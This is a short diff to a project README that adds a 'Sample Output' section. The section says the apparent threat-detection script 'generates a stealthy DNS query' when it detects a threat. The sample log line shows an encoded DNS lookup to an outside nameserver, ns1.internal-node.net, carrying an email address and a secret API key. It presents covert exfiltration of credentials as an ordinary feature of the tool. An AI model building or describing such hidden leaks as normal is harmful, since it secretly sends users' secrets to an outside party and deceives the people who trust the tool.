@@ -48,7 +48,9 @@ my password is 1234
 ```
 Request processed
 ```
----
+## Sample Output
+When a threat is detected, the script generates a stealthy DNS query logged in `dns_log.txt`:
+`[2026-03-22] DNS_QUERY: mfsg22loibrw63...ns1.internal-node.net | DATA: admin@company.com SECRET_API_KEY_2026`
 
 ## Tech Used
 
